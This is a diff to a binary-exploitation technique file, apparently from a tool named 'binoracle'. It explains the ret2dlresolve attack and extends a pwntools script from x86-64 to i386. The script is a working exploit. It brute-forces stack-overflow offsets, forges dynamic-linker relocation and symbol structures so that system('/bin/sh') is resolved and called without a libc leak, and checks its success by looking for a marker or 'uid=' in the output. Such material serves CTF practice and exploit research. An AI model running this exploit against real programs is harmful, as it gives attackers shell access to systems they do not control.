@@ -2,9 +2,10 @@
 
 When a binary has a stack overflow but no win(), no system() in it, and no way to leak a libc
 address, you can still get a shell by forging the dynamic linker's lazy-resolution structures
-(Elf64_Rela + Elf64_Sym + the symbol string) in a writable region and calling the PLT-0 resolver
-stub with a crafted relocation index, so the linker resolves and calls system("/bin/sh") for you --
-no leak required. pwntools builds the forged structures (`Ret2dlresolvePayload`).
+(Elf64_Rela + Elf64_Sym on x86-64, Elf32_Rel + Elf32_Sym on i386, plus the symbol string) in a
+writable region and calling the PLT-0 resolver stub with a crafted relocation index, so the linker
+resolves and calls system("/bin/sh") for you -- no leak required. pwntools builds the forged
+structures (`Ret2dlresolvePayload`). Both x86-64 and x86-32 (cdecl) targets are handled.
 
 Preconditions binoracle reasons about: dynamic ELF, no-PIE (fixed addresses), **Partial RELRO**
 (Full RELRO / BIND_NOW resolves everything at load and removes the lazy path -> kills it), an
@@ -26,15 +27,19 @@ context.binary = elf = ELF(name, checksec=False); context.log_level = "error"
 # Preconditions: dynamic + no-PIE + not Full RELRO. (Full RELRO removes the lazy-resolution path.)
 if elf.pie or elf.statically_linked or str(getattr(elf, "relro", "")).lower() == "full":
     print("NOT_APPLICABLE (needs dynamic, no-PIE, not Full RELRO)"); sys.exit(1)
+is32 = elf.bits == 32
 try:
     ret = ROP(elf).find_gadget(["ret"]).address
 except Exception:
     ret = None
 MARK = b"BINORACLE_DLR_PWNED"
-# Try the common return-address offsets; for each, build read(0,data)->ret2dlresolve, optionally
-# with a `ret` for 16-byte stack alignment before the resolver calls system (movaps).
-for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
-    for align in ((False, True) if ret else (False,)):
+# Try the common return-address offsets; for each, build read(0,data)->ret2dlresolve. On x86-64 the
+# read() call takes an explicit count (-> rdx) and we optionally insert a `ret` for 16-byte stack
+# alignment before the resolver calls system (movaps). On i386 calls are cdecl (args on the stack),
+# no movaps alignment is needed, and read(0,data) without an explicit count is the reliable form.
+for off in [76, 72, 68, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 200]:
+    aligns = (False,) if is32 else ((False, True) if ret else (False,))
+    for align in aligns:
         io = None
         try:
             io = process([name])
@@ -42,8 +47,11 @@ for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 2
             except Exception: pass
             rop = ROP(elf)
             dl = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
-            rop.read(0, dl.data_addr, len(dl.payload))     # explicit count -> sets rdx
-            if align: rop.raw(ret)
+            if is32:
+                rop.read(0, dl.data_addr)                   # cdecl; pwntools cleans the frame
+            else:
+                rop.read(0, dl.data_addr, len(dl.payload))  # explicit count -> sets rdx
+                if align: rop.raw(ret)
             rop.ret2dlresolve(dl)
             io.send(flat({off: rop.chain()})); time.sleep(0.25)
             io.send(dl.payload); time.sleep(0.25)
@@ -53,7 +61,8 @@ for off in [72, 64, 88, 56, 96, 80, 104, 120, 40, 48, 112, 128, 136, 152, 168, 2
             except Exception: pass
             io.close()
             if MARK in out or b"uid=" in out:
-                print("VERIFIED off=%d align=%s data=%#x" % (off, "ret" if align else "none", dl.data_addr))
+                print("VERIFIED off=%d align=%s data=%#x bits=%d"
+                      % (off, "ret" if align else "none", dl.data_addr, elf.bits))
                 sys.exit(0)
         except Exception:
             try:
